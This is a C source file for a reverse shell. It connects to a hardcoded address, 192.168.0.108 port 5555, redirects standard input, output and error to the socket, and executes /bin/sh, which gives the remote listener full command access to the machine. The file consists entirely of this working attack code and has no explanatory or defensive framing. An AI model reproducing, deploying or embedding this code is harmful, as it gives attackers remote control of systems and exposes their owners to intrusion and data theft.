#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>


#define IP "192.168.0.108"
#define PORT "5555"

int main()
{
	int s;
	if((s=socket(AF_INET,SOCK_STREAM,0))==-1)
	{
		perror("[-] Error Creating Socket Descriptor\n");		
		exit(-1);
	}

	int optval=1;
	if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1)
	{
		perror("[-] Error in setsockopt()\n");
		exit(-3);
	}

	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof(hints));

	hints.ai_family = AF_UNSPEC;  // use IPv4 or IPv6, whichever
	hints.ai_socktype = SOCK_STREAM;
	getaddrinfo(IP, PORT, &hints, &res);

	connect(s,res->ai_addr,res->ai_addrlen);

	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);

	char *shell[2];
	shell[0]="/bin/sh";
	shell[1]=NULL;	
	execve(shell[0], shell, NULL);
	close(s);
	return 0;


}
